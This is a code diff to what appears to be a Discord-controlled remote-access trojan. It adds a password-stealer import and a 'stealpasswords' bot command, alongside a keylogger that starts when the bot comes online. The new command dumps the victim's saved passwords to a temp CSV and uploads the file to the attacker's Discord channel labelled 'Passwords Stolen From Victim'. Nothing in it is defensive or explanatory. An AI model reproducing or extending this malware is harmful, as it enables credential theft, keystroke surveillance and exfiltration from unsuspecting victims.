@@ -9,7 +9,7 @@ from bot_core import fetch_victim_info
 from bot_core import keylogger
 import asyncio
 import tempfile
-
+from bot_core import passwordstealer
 intents = discord.Intents.default()
 
 intents.message_content = True
@@ -95,5 +95,21 @@ async def on_ready():
     print(f"Bot is online as {bot.user}")
     
     keylogger.start_keylogger()
+
+PASSWORD_FILE = os.path.join(tempfile.gettempdir(), 'passwords.csv')
+@bot.command
+async def stealpasswords(ctx):
+    passwordstealer.dump_passwords()
+    await asyncio.sleep(2)
+
+    try:
+        await ctx.send("Passwords Stolen From Victim",file = discord.file(PASSWORD_FILE))
+    except Exception as e:
+        await ctx.send(f"Failed to send file: {e}")
+
+
+
+    
+
 
 bot.run(TOKEN)
